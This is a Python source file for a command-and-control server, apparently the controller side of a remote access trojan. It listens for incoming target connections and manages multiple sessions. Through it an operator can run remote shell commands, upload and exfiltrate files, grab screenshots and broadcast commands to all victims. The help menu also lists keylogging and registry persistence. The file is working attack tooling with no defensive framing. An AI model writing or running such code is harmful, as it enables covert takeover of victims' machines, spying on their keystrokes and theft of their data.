import socket
import termcolor
import json
import os
import threading
from termcolor import colored
import pyfiglet



def recv_data(target):
    data = ''
    while True:
        try:
            data = data + target.recv(1024).decode().rstrip()
            return json.loads(data)
        except ValueError:
            continue

def send_data(target, data):
    jsondata = json.dumps(data)
    target.send(jsondata.encode())

def upload_file(target, file_name):
    f = open(file_name, 'rb')
    target.send(f.read())

def download_file(target, file_name):
    f = open(file_name, 'wb')
    target.settimeout(1)
    chunk = target.recv(1024)
    while chunk:
        f.write(chunk)
        try:
            chunk = target.recv(1024)
        except socket.timeout as e:
            break
    target.settimeout(None)
    f.close()


def target_communication(target, ip):
    count = 0
    while True:
        command = input('* Shell~%s: ' % str(ip))
        send_data(target, command)
        if command == 'quit':
            break
        elif command == 'background':
            break
        elif command == 'clear':
            os.system('clear')
        elif command[:3] == 'cd ':
            pass
        elif command[:6] == 'upload':
            upload_file(target, command[7:])
        elif command[:8] == 'download':
            download_file(target, command[9:])
        elif command[:10] == 'screenshot':
            f = open('screenshot%d' % (count), 'wb')
            target.settimeout(3)
            chunk = target.recv(1024)
            while chunk:
                f.write(chunk)
                try:
                    chunk = target.recv(1024)
                except socket.timeout as e:
                    break
            target.settimeout(None)
            f.close()
            count += 1
        elif command == 'help':
            print(termcolor.colored('''\n
            quit                                --> Quit Session With The Target
            clear                               --> Clear The Screen
            cd *Directory Name*                 --> Changes Directory On Target System
            upload *file name*                  --> Upload File To The Target Machine
            download *file name*                --> Download File From Target Machine
            screenshot                          --> Take Screenshot of Target Machine
            keylog_start                        --> Start The Keylogger
            keylog_dump                         --> Print Keystrokes That The Target Inputted
            keylog_stop                         --> Stop And Self Destruct Keylogger File
            persistence *RegName* *fileName*    --> Create Persistence In Registry\n''', 'yellow'))
        else:
            result = recv_data(target)
            print(result)

def accept_connections():
    while True:
        if stop_flag:
            break
        sock.settimeout(1)
        try:
            target, ip = sock.accept()
            targets.append(target)
            ips.append(ip)
            print(termcolor.colored(str(ip) + ' has connected!', 'green'))
        except:
            pass

if __name__ == "__main__":

    ascii_banner = colored(pyfiglet.figlet_format(f"C2 Server\n"),"magenta")
    print(ascii_banner)
    targets = []
    ips = []
    stop_flag = False
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.bind(('192.168.1.103', 5555))
    sock.listen(5)
    t1 = threading.Thread(target=accept_connections)
    t1.start()
    print(termcolor.colored('[+] Waiting For The Incoming Connections ...', 'green'))

    while True:
        command = input(colored('[**] Command & Control Center: ','yellow'))
        if command == 'targets':
            counter = 0
            for ip in ips:
                print('Session ' + str(counter) + ' --- ' + str(ip))
                counter += 1
        elif command == 'clear':
            os.system('clear')
        elif command[:7] == 'session':
            try:
                num = int(command[8:])
                tarnum = targets[num]
                tarip = ips[num]
                target_communication(tarnum, tarip)
            except:
                print('[-] No Session Under That ID Number')
        elif command == 'exit':
            for target in targets:
                send_data(target, 'quit')
                target.close()
            sock.close()
            stop_flag = True
            t1.join()
            break
        elif command[:4] == 'kill':
            targ = targets[int(command[5:])]
            ip = ips[int(command[5:])]
            send_data(targ, 'quit')
            targ.close()
            targets.remove(targ)
            ips.remove(ip)
        elif command[:7] == 'sendall':
            x = len(targets)
            print(x)
            i = 0
            try:
                while i < x:
                    tarnumber = targets[i]
                    print(tarnumber)
                    send_data(tarnumber, command)
                    i += 1
            except:
                print('Failed')
        else:
            print(termcolor.colored('[!!] Command Doesn\'t Exist', 'red'))